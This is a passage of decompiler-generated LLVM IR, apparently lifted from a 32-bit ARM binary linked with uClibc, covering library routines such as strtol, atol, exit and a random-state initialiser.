  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_c620 = load i32, i32* @r4, align 4
  %v6_c620 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_c650, label %dec_label_pc_c640

dec_label_pc_c640:                                ; preds = %entry
  %v2_c640 = icmp ugt i32 %arg2, 254
  %v7_c640 = icmp eq i32 %arg2, 255
  %v2_c644 = xor i1 %v7_c640, true
  %v3_c644 = and i1 %v2_c640, %v2_c644
  br i1 %v3_c644, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_c640
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_c640, %bb
  %v1_c67c7 = phi i32 [ %v3_c620, %dec_label_pc_c640 ], [ 4, %bb ]
  %v2_c648 = xor i1 %v2_c640, true
  %v3_c648 = or i1 %v7_c640, %v2_c648
  br i1 %v3_c648, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_c650:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_c668, label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c650
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_c6d8

.thread10:                                        ; preds = %dec_label_pc_c658
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_c668:                                ; preds = %dec_label_pc_c650
  %v2_c668 = icmp ugt i32 %arg2, 62
  %v7_c668 = icmp eq i32 %arg2, 63
  %v2_c66c = xor i1 %v7_c668, true
  %v3_c66c = and i1 %v2_c668, %v2_c66c
  br i1 %v3_c66c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_c668
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_c668, %bb23
  %v1_c67c6 = phi i32 [ %v3_c620, %dec_label_pc_c668 ], [ 2, %bb23 ]
  %v2_c670 = xor i1 %v2_c668, true
  %v3_c670 = or i1 %v7_c668, %v2_c670
  br i1 %v3_c670, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_c688 = phi i32 [ 3, %bb22 ], [ %v1_c67c7, %bb21 ], [ %v1_c67c6, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37476), i32* %r3.global-to-local, align 4
  %v4_c67c = mul i32 %v1_c688, 4
  %v5_c67c = add i32 %v4_c67c, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37476)
  store i32 %v5_c67c, i32* %r2.global-to-local, align 4
  %v1_c680 = add i32 %v4_c67c, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37456)
  %v2_c680 = inttoptr i32 %v1_c680 to i32*
  %v3_c680 = load i32, i32* %v2_c680, align 4
  store i32 %v3_c680, i32* %r1.global-to-local, align 4
  %v1_c684 = add i32 %tmp, 4
  store i32 %v1_c684, i32* @r6, align 4
  %v6_c688 = inttoptr i32 %v5_c67c to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* %r2.global-to-local, align 4
  %v4_c68c = mul i32 %v3_c680, 4
  %v5_c68c = add i32 %v4_c68c, %v1_c684
  store i32 %v5_c68c, i32* %r3.global-to-local, align 4
  %v2_c690 = add i32 %arg3, 16
  %v3_c690 = inttoptr i32 %v2_c690 to i32*
  store i32 %v5_c68c, i32* %v3_c690, align 4
  %v0_c694 = load i32, i32* %r2.global-to-local, align 4
  %v1_c694 = trunc i32 %v0_c694 to i8
  %v2_c694 = load i32, i32* @r5, align 4
  %v3_c694 = add i32 %v2_c694, 14
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r1.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i8
  %v2_c698 = load i32, i32* @r5, align 4
  %v3_c698 = add i32 %v2_c698, 13
  %v4_c698 = inttoptr i32 %v3_c698 to i8*
  store i8 %v1_c698, i8* %v4_c698, align 1
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = trunc i32 %v0_c69c to i8
  %v2_c69c = load i32, i32* @r5, align 4
  %v3_c69c = add i32 %v2_c69c, 12
  %v4_c69c = inttoptr i32 %v3_c69c to i8*
  store i8 %v1_c69c, i8* %v4_c69c, align 1
  %v0_c6a0 = load i32, i32* @r6, align 4
  %v1_c6a0 = load i32, i32* @r5, align 4
  %v2_c6a0 = add i32 %v1_c6a0, 8
  %v3_c6a0 = inttoptr i32 %v2_c6a0 to i32*
  store i32 %v0_c6a0, i32* %v3_c6a0, align 4
  %v0_c6a4 = load i32, i32* @r5, align 4
  store i32 %v0_c6a4, i32* %r1.global-to-local, align 4
  %v0_c6a8 = load i32, i32* @r0, align 4
  %v2_c6a8 = inttoptr i32 %v0_c6a8 to i32*
  %v3_c6a8 = call i32 @srandom_r(i32* %v2_c6a8, i32 %v0_c6a4)
  store i32 %v3_c6a8, i32* %r0.global-to-local, align 4
  %v0_c6ac = load i32, i32* @r4, align 4
  %v2_c6ac = icmp eq i32 %v0_c6ac, 0
  br i1 %v2_c6ac, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_c6c812 = load i32, i32* @r7, align 4
  %v2_c6c813 = inttoptr i32 %v1_c6c812 to i32*
  store i32 0, i32* %v2_c6c813, align 4
  %v1_c6cc = load i32, i32* @r4, align 4
  store i32 %v1_c6cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6f0

.thread4:                                         ; preds = %bb26
  %v1_c6b0 = load i32, i32* @r5, align 4
  %v2_c6b0 = add i32 %v1_c6b0, 4
  %v3_c6b0 = inttoptr i32 %v2_c6b0 to i32*
  %v4_c6b0 = load i32, i32* %v3_c6b0, align 4
  %v1_c6b4 = load i32, i32* @r6, align 4
  %v3_c6b4 = sub i32 %v4_c6b0, %v1_c6b4
  %v4_c6b8 = sdiv i32 %v3_c6b4, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_c6c0 = mul i32 %v4_c6b8, 5
  %v5_c6c0 = add i32 %v4_c6c0, %v0_c6ac
  store i32 %v5_c6c0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c6c8 = load i32, i32* @r7, align 4
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i32*
  store i32 0, i32* %v2_c6c8, align 4
  %v1_c6d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_c6d0 = load i32, i32* @r7, align 4
  %v3_c6d0 = inttoptr i32 %v2_c6d0 to i32*
  store i32 %v1_c6d0, i32* %v3_c6d0, align 4
  %v1_c6f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6f0

dec_label_pc_c6d8:                                ; preds = %dec_label_pc_c658
  %v0_c6d8 = call i32 @__GI___errno_location()
  store i32 %v0_c6d8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_c6e0 = inttoptr i32 %v0_c6d8 to i32*
  store i32 22, i32* %v2_c6e0, align 4
  %v0_c6e4 = call i32 @__GI___errno_location()
  %v0_c6e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_c6e8 = inttoptr i32 %v0_c6e4 to i32*
  store i32 %v0_c6e8, i32* %v2_c6e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6f0

dec_label_pc_c6f0:                                ; preds = %bb27, %.thread4, %dec_label_pc_c6d8
  %v1_c6f8 = phi i32 [ %v1_c6f8.pre, %.thread4 ], [ %v1_c6cc, %bb27 ], [ -1, %dec_label_pc_c6d8 ]
  store i32 %v3_c620, i32* @r4, align 4
  store i32 %v6_c620, i32* @r5, align 4
  ret i32 %v1_c6f8

; uselistorder directives
  uselistorder i1 %v7_c668, { 1, 0 }
  uselistorder i1 %v7_c640, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37476), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_c714 = call i32 @strtol()
  ret i32 %v0_c714
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_c730 = call i32 @_stdlib_strto_l()
  ret i32 %v0_c730
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_c754 = load i32, i32* @r1, align 4
  store i32 %v0_c754, i32* %fp.global-to-local, align 4
  %v0_c758 = load i32, i32* @r2, align 4
  store i32 %v0_c758, i32* %r5.global-to-local, align 4
  %v0_c75c = load i32, i32* @r0, align 4
  store i32 %v0_c75c, i32* %r4.global-to-local, align 4
  %v0_c760 = load i32, i32* @r3, align 4
  br label %dec_label_pc_c76c

dec_label_pc_c768:                                ; preds = %dec_label_pc_c76c
  %v1_c768 = add i32 %v0_c7a4, 1
  store i32 %v1_c768, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c76c

dec_label_pc_c76c:                                ; preds = %entry, %dec_label_pc_c768
  %v0_c7a4 = phi i32 [ %v0_c75c, %entry ], [ %v1_c768, %dec_label_pc_c768 ]
  %v1_c76c = inttoptr i32 %v0_c7a4 to i8*
  %v2_c76c = load i8, i8* %v1_c76c, align 1
  %v3_c76c = zext i8 %v2_c76c to i32
  %v4_c770 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 140) to i32*), align 4
  %v2_c774 = mul nuw nsw i32 %v3_c76c, 2
  %v2_c778 = add i32 %v2_c774, %v4_c770
  %v3_c778 = inttoptr i32 %v2_c778 to i16*
  %v4_c778 = load i16, i16* %v3_c778, align 2
  %v1_c77c = and i16 %v4_c778, 32
  %v2_c77c = icmp eq i16 %v1_c77c, 0
  br i1 %v2_c77c, label %dec_label_pc_c784, label %dec_label_pc_c768

dec_label_pc_c784:                                ; preds = %dec_label_pc_c76c
  %v7_c784 = icmp eq i8 %v2_c76c, 43
  br i1 %v7_c784, label %dec_label_pc_c7a4, label %dec_label_pc_c78c

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c784
  %v7_c78c = icmp eq i8 %v2_c76c, 45
  br i1 %v7_c78c, label %dec_label_pc_c7a4, label %bb

bb:                                               ; preds = %dec_label_pc_c78c
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c7a8

dec_label_pc_c7a4:                                ; preds = %dec_label_pc_c784, %dec_label_pc_c78c
  %storemerge47 = phi i32 [ 1, %dec_label_pc_c78c ], [ 0, %dec_label_pc_c784 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_c7a4 = add i32 %v0_c7a4, 1
  store i32 %v1_c7a4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c7a8

dec_label_pc_c7a8:                                ; preds = %bb, %dec_label_pc_c7a4
  %v0_c7c8 = phi i32 [ %v0_c7a4, %bb ], [ %v1_c7a4, %dec_label_pc_c7a4 ]
  %v1_c7a8 = and i32 %v0_c758, -17
  %v3_c7a8 = icmp eq i32 %v1_c7a8, 0
  br i1 %v3_c7a8, label %dec_label_pc_c7b4, label %bb60

bb60:                                             ; preds = %dec_label_pc_c7a8
  br label %bb64

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c7a8
  %v1_c7b4 = inttoptr i32 %v0_c7c8 to i8*
  %v2_c7b4 = load i8, i8* %v1_c7b4, align 1
  %v7_c7b8 = icmp eq i8 %v2_c7b4, 48
  %v1_c7bc = add i32 %v0_c758, 10
  store i32 %v1_c7bc, i32* %r5.global-to-local, align 4
  br i1 %v7_c7b8, label %dec_label_pc_c7c8, label %bb61

bb61:                                             ; preds = %dec_label_pc_c7b4
  br label %.thread8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c7b4
  %v1_c7c8 = add i32 %v0_c7c8, 1
  %v2_c7c8 = inttoptr i32 %v1_c7c8 to i8*
  %v3_c7c8 = load i8, i8* %v2_c7c8, align 1
  %v4_c7c8 = zext i8 %v3_c7c8 to i32
  store i32 %v1_c7c8, i32* %r4.global-to-local, align 4
  %v1_c7cc = or i32 %v4_c7c8, 32
  %v7_c7d0 = icmp eq i32 %v1_c7cc, 120
  %v1_c7d4 = add i32 %v0_c758, 8
  store i32 %v1_c7d4, i32* %r5.global-to-local, align 4
  br i1 %v7_c7d0, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_c7c8
  %v3_c7e0 = mul i32 %v1_c7d4, 2
  store i32 %v3_c7e0, i32* %r5.global-to-local, align 4
  %v2_c7e4 = add i32 %v0_c7c8, 2
  store i32 %v2_c7e4, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_c7c8, %bb61, %bb62
  %v1_c8b030 = phi i32 [ %v0_c75c, %bb61 ], [ %v1_c7c8, %bb62 ], [ %v1_c7c8, %dec_label_pc_c7c8 ]
  %v0_c83421 = phi i32 [ %v0_c7c8, %bb61 ], [ %v2_c7e4, %bb62 ], [ %v1_c7c8, %dec_label_pc_c7c8 ]
  %v0_c7e8 = phi i32 [ %v1_c7bc, %bb61 ], [ %v3_c7e0, %bb62 ], [ %v1_c7d4, %dec_label_pc_c7c8 ]
  %v5_c7ec = icmp slt i32 %v0_c7e8, 16
  br i1 %v5_c7ec, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_c8b029 = phi i32 [ %v0_c75c, %bb60 ], [ %v1_c8b030, %.thread8 ], [ %v1_c8b030, %bb63 ]
  %v0_c83420 = phi i32 [ %v0_c7c8, %bb60 ], [ %v0_c83421, %.thread8 ], [ %v0_c83421, %bb63 ]
  %v0_c814 = phi i32 [ %v0_c758, %bb60 ], [ %v0_c7e8, %.thread8 ], [ 16, %bb63 ]
  %v1_c7f0 = add i32 %v0_c814, -2
  %tmp = icmp ugt i32 %v1_c7f0, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_c800

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_c8ac

dec_label_pc_c800:                                ; preds = %bb64
  %v2_c808 = udiv i32 -1, %v0_c814
  %v3_c808 = urem i32 -1, %v0_c814
  %v1_c818 = urem i32 %v3_c808, 256
  store i32 %v1_c818, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_c808, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_c834

dec_label_pc_c830:                                ; preds = %bb71, %dec_label_pc_c890
  %v0_c830 = phi i32 [ %v1_c87044, %bb71 ], [ %v0_c830.pre, %dec_label_pc_c890 ]
  br label %dec_label_pc_c834

dec_label_pc_c834:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c830
  %v1_c8b027 = phi i32 [ %v1_c8b029, %dec_label_pc_c800 ], [ %v0_c830, %dec_label_pc_c830 ]
  %v0_c870 = phi i32 [ %v0_c83420, %dec_label_pc_c800 ], [ %v0_c830, %dec_label_pc_c830 ]
  %v1_c834 = inttoptr i32 %v0_c870 to i8*
  %v2_c834 = load i8, i8* %v1_c834, align 1
  %v3_c834 = zext i8 %v2_c834 to i32
  %v1_c838 = add nsw i32 %v3_c834, -48
  %v1_c83c = urem i32 %v1_c838, 256
  %v1_c844 = or i32 %v3_c834, 32
  %tmp79 = icmp ult i32 %v1_c83c, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_c84c

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c834
  %tmp80 = icmp ugt i32 %v1_c844, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_c84c
  %v1_c850 = add nsw i32 %v1_c844, -87
  %v5_c858 = urem i32 %v1_c850, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_c834, %dec_label_pc_c84c, %bb65
  %v3_c888 = phi i32 [ %v1_c83c, %dec_label_pc_c834 ], [ 40, %dec_label_pc_c84c ], [ %v5_c858, %bb65 ]
  %v1_c85c = load i32, i32* %r5.global-to-local, align 4
  %v6_c860 = icmp slt i32 %v3_c888, %v1_c85c
  br i1 %v6_c860, label %dec_label_pc_c864, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c864:                                ; preds = %bb66
  %v0_c864 = load i32, i32* @ip, align 4
  %v1_c864 = load i32, i32* %r8.global-to-local, align 4
  %v9_c864 = icmp eq i32 %v0_c864, %v1_c864
  br i1 %v9_c864, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_c864
  %v1_c87040 = add i32 %v0_c870, 1
  store i32 %v1_c87040, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c878

bb67:                                             ; preds = %dec_label_pc_c864
  %v3_c864 = icmp ult i32 %v0_c864, %v1_c864
  %v1_c870 = add i32 %v0_c870, 1
  store i32 %v1_c870, i32* %r4.global-to-local, align 4
  br i1 %v3_c864, label %dec_label_pc_c878, label %dec_label_pc_c890

dec_label_pc_c878:                                ; preds = %bb67, %.thread39
  %v1_c87044 = phi i32 [ %v1_c87040, %.thread39 ], [ %v1_c870, %bb67 ]
  %v4_c8802443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_c878 = load i32, i32* %sl.global-to-local, align 4
  %v3_c878 = icmp uge i32 %v3_c888, %v1_c878
  %v9_c878 = icmp eq i32 %v3_c888, %v1_c878
  %v2_c87c = xor i1 %v3_c878, true
  %v3_c87c = or i1 %v9_c878, %v2_c87c
  br i1 %v3_c87c, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_c878
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_c878, %bb68
  %v4_c880 = phi i32 [ %v4_c8802443, %dec_label_pc_c878 ], [ 0, %bb68 ]
  %v2_c880 = xor i1 %v9_c878, true
  %v3_c880 = and i1 %v3_c878, %v2_c880
  br i1 %v3_c880, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_c880 = urem i32 %v4_c880, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_c884 = phi i32 [ %v5_c880, %bb70 ], [ %v4_c880, %bb69 ]
  %v2_c884 = icmp eq i32 %v0_c884, 0
  br i1 %v2_c884, label %bb71, label %dec_label_pc_c890

bb71:                                             ; preds = %thread-pre-split
  %v4_c888 = mul i32 %v0_c864, %v1_c85c
  %v5_c888 = add i32 %v4_c888, %v3_c888
  store i32 %v5_c888, i32* @ip, align 4
  br label %dec_label_pc_c830

dec_label_pc_c890:                                ; preds = %bb67, %thread-pre-split
  %v0_c890 = call i32 @__GI___errno_location()
  %v0_c898 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c898, i32* @ip, align 4
  %v0_c89c = load i32, i32* %r7.global-to-local, align 4
  %v2_c89c = and i32 %v0_c89c, %v0_c760
  store i32 %v2_c89c, i32* %r7.global-to-local, align 4
  %v2_c8a4 = inttoptr i32 %v0_c890 to i32*
  store i32 34, i32* %v2_c8a4, align 4
  %v0_c830.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c830

dec_label_pc_c8ac.loopexit:                       ; preds = %bb66
  %v0_c8ac.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %.thread, %dec_label_pc_c8ac.loopexit
  %v1_c8b0 = phi i32 [ %v1_c8b027, %dec_label_pc_c8ac.loopexit ], [ %v1_c8b029, %.thread ]
  %v2_c8b0 = phi i32 [ %v0_c8ac.pre, %dec_label_pc_c8ac.loopexit ], [ %v0_c754, %.thread ]
  %v2_c8ac = icmp eq i32 %v2_c8b0, 0
  br i1 %v2_c8ac, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_c8ac
  %v3_c8b0 = inttoptr i32 %v2_c8b0 to i32*
  store i32 %v1_c8b0, i32* %v3_c8b0, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_c8ac, %bb72
  %v0_c8b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_c8b8 = icmp eq i32 %v0_c8b8, 0
  %. = select i1 %v2_c8b8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_c8c4 = icmp eq i32 %v0_c760, 0
  %v0_c8e8.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_c8c4, label %dec_label_pc_c8e0, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_c8e8.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_c8d0, label %dec_label_pc_c8e0

dec_label_pc_c8d0:                                ; preds = %bb76
  %v0_c8d0 = call i32 @__GI___errno_location()
  %v2_c8d8 = inttoptr i32 %v0_c8d0 to i32*
  store i32 34, i32* %v2_c8d8, align 4
  %v0_c8dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c8dc, i32* @ip, align 4
  %v0_c8e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c8e0

dec_label_pc_c8e0:                                ; preds = %bb76, %bb73, %dec_label_pc_c8d0
  %v0_c8e8.pre = phi i32 [ %v0_c8e8.pre.pre, %bb76 ], [ %v0_c8dc, %dec_label_pc_c8d0 ], [ %v0_c8e8.pre.pre, %bb73 ]
  %v0_c8e0 = phi i32 [ %v0_c8b8, %bb76 ], [ %v0_c8e0.pre, %dec_label_pc_c8d0 ], [ %v0_c8b8, %bb73 ]
  %v2_c8e0 = icmp eq i32 %v0_c8e0, 0
  br i1 %v2_c8e0, label %dec_label_pc_c8e0._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_c8e0
  %v2_c8e4 = sub i32 0, %v0_c8e8.pre
  store i32 %v2_c8e4, i32* @ip, align 4
  br label %dec_label_pc_c8e0._crit_edge

dec_label_pc_c8e0._crit_edge:                     ; preds = %dec_label_pc_c8e0, %bb77
  %v0_c8e8 = phi i32 [ %v2_c8e4, %bb77 ], [ %v0_c8e8.pre, %dec_label_pc_c8e0 ]
  ret i32 %v0_c8e8

; uselistorder directives
  uselistorder i32 %v0_c8e8.pre, { 1, 0 }
  uselistorder i32 %v0_c8e8.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_c880, { 1, 0 }
  uselistorder i1 %v3_c878, { 1, 0 }
  uselistorder i32 %v1_c878, { 1, 0 }
  uselistorder i32 %v1_c844, { 1, 0 }
  uselistorder i32 %v1_c83c, { 1, 0 }
  uselistorder i32 %v0_c870, { 1, 0, 2 }
  uselistorder i32 %v0_c830, { 1, 0 }
  uselistorder i32 %v3_c7e0, { 1, 0 }
  uselistorder i32 %v1_c7d4, { 1, 0, 2 }
  uselistorder i32 %v0_c7c8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_c7a4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c760, { 1, 0 }
  uselistorder i32 %v0_c75c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c758, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 8, 2, 9, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_c8e0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_c8e0, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
  uselistorder label %dec_label_pc_c890, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c834, { 1, 0 }
  uselistorder label %dec_label_pc_c830, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c7a8, { 1, 0 }
  uselistorder label %dec_label_pc_c7a4, { 1, 0 }
  uselistorder label %dec_label_pc_c76c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  %v4_c90c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 92) to i32*), align 4
  store i32 %v4_c90c, i32* @r4, align 4
  %v2_c914 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_c92c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c92c)
  %v0_c940 = load i32, i32* @r5, align 4
  %v2_c940 = add i32 %v0_c940, 16
  %v3_c940 = inttoptr i32 %v2_c940 to i32*
  %v4_c940 = load i32, i32* %v3_c940, align 4
  call void @__pseudo_branch(i32 %v4_c940)
  %v0_c950 = load i32, i32* @r5, align 4
  %v2_c950 = add i32 %v0_c950, 1276
  %v3_c950 = inttoptr i32 %v2_c950 to i32*
  %v4_c950 = load i32, i32* %v3_c950, align 4
  %v2_c954 = icmp eq i32 %v4_c950, 0
  br i1 %v2_c954, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_c960 = xor i1 %v2_c954, true
  call void @__pseudo_cond_branch(i1 %v2_c960, i32 %v4_c950)
  store i32 %v2_c914, i32* @r0, align 4
  %v0_c970 = load i32, i32* @r5, align 4
  %v2_c970 = add i32 %v0_c970, 24
  %v3_c970 = inttoptr i32 %v2_c970 to i32*
  %v4_c970 = load i32, i32* %v3_c970, align 4
  call void @__pseudo_branch(i32 %v4_c970)
  %v0_c97c = call i32 @__GI___uClibc_fini()
  %v0_c984 = load i32, i32* @r5, align 4
  %v2_c984 = add i32 %v0_c984, -68124
  %v9_c984 = icmp eq i32 %v2_c984, 0
  br i1 %v9_c984, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_c98c = xor i1 %v9_c984, true
  call void @__pseudo_cond_branch(i1 %v2_c98c, i32 %v2_c984)
  %v0_c990 = load i32, i32* @r6, align 4
  %v1_c994 = call i32 @__GI__exit(i32 %v0_c990)
  %v0_c998 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c998, label %.thread5, label %.thread6

.thread5:                                         ; preds = %bb9
  %v1_c998 = load i32, i32* @r1, align 4
  %v5_c998 = mul i32 %v1_c994, 16384
  %v6_c998 = and i32 %v1_c998, %v5_c998
  store i32 %v6_c998, i32* @r2, align 4
  call void @llvm.trap()
  unreachable

.thread6:                                         ; preds = %bb9
  ret i32 %v1_c994

; uselistorder directives
  uselistorder i32 %v1_c994, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 0, 2, 1, 3 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37436), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_c9d8 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37436))
  store i32 %v1_c9d8, i32* @r6, align 4
  %v2_c9dc = icmp eq i32 %v1_c9d8, 0
  br i1 %v2_c9dc, label %dec_label_pc_ca5c, label %dec_label_pc_c9e4

dec_label_pc_c9e4:                                ; preds = %entry
  store i32 140, i32* @sl, align 4
  %v0_c9ec = load i32, i32* @r4, align 4
  %v2_c9ec = add i32 %v0_c9ec, -37424
  store i32 %v2_c9ec, i32* @r8, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_c9f0, i32* @r7, align 4
  br label %bb18

dec_label_pc_c9f8:                                ; preds = %bb18
  %v3_c9f8 = load i32, i32* %stack_var_-36, align 4
  %v1_c9fc = inttoptr i32 %v3_c9f8 to i32*
  %v2_c9fc = load i32, i32* %v1_c9fc, align 4
